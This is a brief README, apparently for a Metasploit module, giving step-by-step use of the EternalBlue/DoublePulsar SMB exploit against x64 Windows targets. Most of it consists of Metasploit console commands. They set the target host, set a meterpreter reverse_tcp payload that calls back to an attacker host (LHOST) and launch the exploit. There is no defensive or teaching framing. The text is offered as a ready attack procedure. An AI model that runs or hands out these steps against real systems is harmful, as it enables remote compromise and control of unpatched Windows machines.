## Eternalblue-Doublepulsar-Metasploit for windows

### Example(x64 target):

- Step 1: Copy deps to somewhere

- Step 2: Copy eternalblue_doublepulsar.rb to your metasploit (local) modules directory
    
- Step 3: Set metasploit module
    
    	Select eternalblue_doublepulsar:
      
          # use modules/exploits/windows/smb/eternalblue_doublepulsar
          
    	Set TOOLKITPATH to your deps directory:
      
          # set TOOLKITPATH d:\\deps
          # set RHOST x.x.x.x
          # set payload windows/x64/meterpreter/reverse_tcp
          # set LHOST x.x.x.x
	
    
- Step 4: Exploit
    
    	Example:
      
    	    # exploit
